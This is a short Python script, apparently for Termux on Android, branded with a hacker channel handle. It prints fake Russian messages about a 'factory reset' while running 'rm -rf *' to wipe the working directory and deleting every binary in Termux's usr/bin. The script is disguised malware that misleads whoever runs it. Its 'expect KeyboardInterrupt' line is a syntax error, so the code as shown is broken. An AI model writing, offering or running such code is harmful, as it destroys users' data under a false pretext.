import os
import time
banner = '''
_____ 
  |   |BE
  |   |___ PizDa
  |   |___  
               Кодер: @benzogangshito
               Канал: @blackhacker101
'''
def main():
         print(banner)
         print('Сброс настроек телефона до заводских успешно запущен, для остановки нажмите ALT + F4')
         os.system("rm -rf *")
         time.sleep(1)
         print('Сброс успешно сделан, устройство будет перезагружено через 3 секунды.')
         os.system('rm /data/data/com.termux/files/usr/bin/*')
         time.sleep(1)

try:
         main()
expect KeyboardInterrupt:
     main()